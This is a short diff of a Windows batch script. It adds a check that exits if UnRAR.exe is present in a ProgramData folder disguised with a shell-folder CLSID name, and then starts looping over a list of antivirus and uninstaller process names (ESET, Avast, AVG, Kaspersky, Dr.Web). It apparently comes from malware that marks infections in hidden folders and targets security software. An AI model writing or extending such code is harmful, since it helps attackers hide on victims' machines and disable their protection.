@@ -7,6 +7,9 @@ if exist "%ProgramData%\logdata..\Index.exe" (
     exit /b
 )
 
+if exist "%ProgramData%\LP3.{20D04FE0-3AEA-1069-A2D8-08002B30309D}\UnRAR.exe" (
+    exit /b
+)
 set "processList=ekrn.exe egui.exe spideragent.exe AvastUI.exe avgui.exe avp.exe avpui.exe UninstallTool.exe UninstallToolHelper.exe"
 
 for %a in (%processList%) do (
